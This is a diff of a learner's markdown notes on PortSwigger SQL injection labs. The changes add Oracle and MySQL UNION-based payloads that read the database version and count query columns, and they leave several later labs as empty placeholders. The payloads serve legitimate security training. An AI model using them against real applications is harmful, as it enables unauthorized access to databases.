@@ -2,6 +2,8 @@
   <h1>-------------------------------LABS---------------------------------</h1>
 </div>
 
+[CheatSheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+
 ## Lab 1: `Retrieving hidden data`, where you can modify a SQL query to return additional results.
 - Original Query: `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
 - Modified: ![image](https://github.com/user-attachments/assets/e4236490-1079-4f23-92c9-a4097f63a50c)
@@ -66,15 +68,34 @@
 - Login with Admin Creds to Solve the LAb
 - ![image](https://github.com/user-attachments/assets/d73f2473-adfa-4ba2-beac-dfc914e9e354)
 
-## Lab 7: SQL injection attack, querying the database type and version on Oracle `Union Query` [Link]()
+## Lab 7: SQL injection attack, querying the database type and version on Oracle `Union Query` [Link](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-examining-the-database-in-sql-injection-attacks/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)
 - On Oracle databases, every SELECT statement must specify a table to select FROM.
 - If your `UNION SELECT` attack does not query from a table, you will still need to include the `FROM` keyword followed by a valid table name.
 - There is a `built-in table on Oracle called 'dual'` For example: `UNION SELECT 'abc' FROM dual`
 
+1. For Oracle:
 - Original Query: `SELECT * FROM products WHERE category = 'Gifts'`
 - Modified: `SELECT * FROM products WHERE category = 'Gifts' UNION SELECT 'abc','def' FROM dual--`
 - Query to executed by DB after injections: `SELECT * FROM products WHERE category = 'Gifts'' UNION SELECT 'abc','def' FROM dual--`
 - To get the Oracle Version: `SELECT * FROM products WHERE category = 'Gifts'union+SELECT+banner,NULL+FROM+v$version--`
 
-### Injections:
-- `'union+SELECT+banner,NULL+FROM+v$version--` - Concate the second query with Union clause in Original Query.
+- Injections: `'union+SELECT+banner,NULL+FROM+v$version--` - Concate the second query with Union clause in Original Query.
+
+2. For MYSQL:
+- Original Query: `SELECT * FROM products WHERE category = 'Gifts'`
+- Modified:
+```
+- 'UNION+SELECT+NULL,NULL#        Determine the Number of Columns, By comments it's MYSQL DB
+- 'UNION+SELECT+@@version,'abc'#  Refer cheatsheet for cmd
+```
+
+## Lab 9: [Link]()
+
+
+
+
+
+## Lab 10: [Link]()
+
+## Lab 11: [Link]()
+
